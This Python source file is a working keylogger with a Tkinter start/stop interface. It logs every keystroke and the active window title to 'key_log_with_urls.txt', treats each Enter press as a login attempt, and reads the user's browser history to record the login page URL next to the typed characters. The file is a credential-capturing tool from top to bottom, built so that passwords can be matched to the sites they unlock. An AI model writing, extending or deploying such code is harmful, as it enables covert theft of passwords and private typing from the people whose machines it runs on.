import tkinter as tk
from tkinter import messagebox
from pynput.keyboard import Listener, Key
from datetime import datetime
import pygetwindow as gw
import browserhistory as bh  # To fetch browser history
import threading

# File to save logged keys and URLs
LOG_FILE = "key_log_with_urls.txt"
listener = None
last_active_window = None
login_attempt_detected = False

# Function to get the active window title
def get_active_window_title():
    try:
        window = gw.getActiveWindow()
        if window:
            return window.title
        return "Unknown Window"
    except Exception as e:
        return f"Error fetching window: {e}"

# Function to get recent browser history
def get_recent_url():
    try:
        history = bh.get_browserhistory()
        for browser, entries in history.items():
            if entries:
                # Get the last visited URL
                recent_entry = entries[-1]  # Most recent URL
                url, timestamp = recent_entry[0], recent_entry[3]
                return url
        return None
    except Exception as e:
        return f"Error fetching browser history: {e}"

# Function to log key presses and URLs during login attempts
def on_press(key):
    global last_active_window, login_attempt_detected

    # Get current timestamp
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Get current active window
    active_window = get_active_window_title()

    # Check if the active window has changed
    if active_window != last_active_window:
        last_active_window = active_window
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"\n[{timestamp}] Active Window: {active_window}\n")

    # Log the key press
    try:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"[{timestamp}] {key.char}\n")  # Printable characters
    except AttributeError:
        if key == Key.enter:
            # If Enter key is pressed, assume a login attempt
            login_attempt_detected = True
            with open(LOG_FILE, "a") as log_file:
                log_file.write(f"[{timestamp}] [ENTER] - Login Attempt Detected\n")
        else:
            with open(LOG_FILE, "a") as log_file:
                log_file.write(f"[{timestamp}] [{key}]\n")  # Special keys (e.g., Shift, Enter)

# Function to detect login-related URLs
def monitor_urls():
    global login_attempt_detected

    while True:
        if login_attempt_detected:
            url = get_recent_url()
            if url:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(LOG_FILE, "a") as log_file:
                    log_file.write(f"[{timestamp}] Login Attempt URL: {url}\n")
                login_attempt_detected = False

# Function to stop logging
def on_release(key):
    if key == Key.esc:
        return False  # Stop listener when ESC is pressed

# Start keylogging
def start_keylogger():
    global listener
    if listener is None:  # Prevent multiple listeners
        listener = Listener(on_press=on_press, on_release=on_release)
        threading.Thread(target=listener.start, daemon=True).start()
        threading.Thread(target=monitor_urls, daemon=True).start()  # Start URL monitoring
        messagebox.showinfo("Keylogger", "Keylogger started and running in the background.")

# Stop keylogging
def stop_keylogger():
    global listener
    if listener is not None:
        listener.stop()
        listener = None
        messagebox.showinfo("Keylogger", "Keylogger stopped.")

# GUI Application
def create_gui():
    root = tk.Tk()
    root.title("Keylogger with URL Detection")

    # Set window size and disable resizing
    root.geometry("350x200")
    root.resizable(False, False)

    # Add buttons
    start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger, bg="green", fg="white", width=25)
    start_button.pack(pady=10)

    stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger, bg="red", fg="white", width=25)
    stop_button.pack(pady=10)

    # Display instructions
    instruction_label = tk.Label(
        root,
        text="Logs are saved in 'key_log_with_urls.txt'.\nPress 'ESC' to exit the keylogger.",
        wraplength=300,
        fg="blue",
    )
    instruction_label.pack(pady=10)

    # Run the Tkinter loop
    root.mainloop()

# Main Function
if __name__ == "__main__":
    create_gui()
